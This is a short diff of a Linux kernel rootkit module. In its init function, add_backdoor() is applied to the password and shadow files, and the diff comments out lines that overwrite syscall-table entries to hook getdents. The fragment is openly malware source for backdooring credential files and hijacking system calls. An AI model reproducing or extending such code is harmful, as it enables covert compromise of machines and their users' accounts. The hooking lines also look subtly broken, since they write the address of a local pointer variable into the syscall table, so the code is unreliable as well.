@@ -312,13 +312,13 @@ static int __init rootkit_init(void){
 	
 	offset = add_backdoor(password_file);
 	
-	original_getdents = (void *)sys_call_address[offset];                        \
-    	sys_call_address[offset] = (unsigned long*)&original_getdents;
+// 	original_getdents = (void *)sys_call_address[offset];                        \
+//     	sys_call_address[offset] = (unsigned long*)&original_getdents;
 	
    	offset = add_backdoor(shadow_file);
 	
-	original_getdents = (void *)sys_call_address[offset];                        \
-    	sys_call_address[offset] = (unsigned long*)&original_getdents;
+// 	original_getdents = (void *)sys_call_address[offset];                        \
+//     	sys_call_address[offset] = (unsigned long*)&original_getdents;
 	
 	// End Marc
 	
